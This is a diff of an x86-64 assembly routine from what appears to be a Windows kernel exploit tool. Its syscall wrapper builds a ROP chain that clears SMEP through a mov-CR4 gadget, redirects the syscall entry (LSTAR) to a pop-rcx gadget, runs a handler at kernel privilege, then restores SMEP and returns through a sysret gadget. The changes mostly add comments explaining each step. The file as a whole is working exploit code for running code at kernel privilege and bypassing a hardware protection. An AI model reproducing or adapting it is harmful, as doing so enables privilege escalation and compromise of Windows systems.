@@ -4,7 +4,7 @@ extern msrexec_handler : proc
 	; offsets into _KPCR/_KPRCB
 	m_kpcr_rsp_offset  dq	0h		
 	m_kpcr_krsp_offset dq	0h
-	m_system_call dq		0h
+	m_system_call	   dq	0h
 
 	m_mov_cr4_gadget dq 0h
 	m_sysret_gadget  dq 0h
@@ -13,7 +13,6 @@ extern msrexec_handler : proc
 	m_smep_on  dq	0h
 	m_smep_off dq	0h
 
-	; all of these are setup by the c++ code...
 	public m_smep_on
 	public m_smep_off
 
@@ -54,25 +53,28 @@ syscall_handler proc
 syscall_handler endp
 
 syscall_wrapper proc
-	push r10			
-	mov r10, rcx												
-	push m_sysret_gadget										
+	push r10													; syscall puts RIP into rcx...
+	mov r10, rcx												; swap r10 and rcx...
+	push m_sysret_gadget										; REX.W prefixed...
 
-	lea rax, finish												
-	push rax
-	push m_pop_rcx_gadget
+	lea rax, finish												; preserved value of RIP by putting it on the stack here...
+	push rax													;
 
-	push m_mov_cr4_gadget										
-	push m_smep_on
-	push m_pop_rcx_gadget
+	push m_pop_rcx_gadget										; gadget to put RIP back into rcx...
 
-	lea rax, syscall_handler									
-	push rax
+	push m_mov_cr4_gadget										; turn smep back on...
 
-	push m_mov_cr4_gadget										
-	push m_smep_off												
-	syscall
+	push m_smep_on												; value of CR4 with smep off...
+	push m_pop_rcx_gadget										;
 
+	lea rax, syscall_handler									; rop to syscall_handler to handle the syscall...
+	push rax													;
+
+	push m_mov_cr4_gadget										; disable smep...
+	push m_smep_off												; 
+
+	syscall														; LSTAR points at a pop rcx gadget... 
+																; it will put m_smep_off into rcx...
 finish:
 	pop r10
 	ret
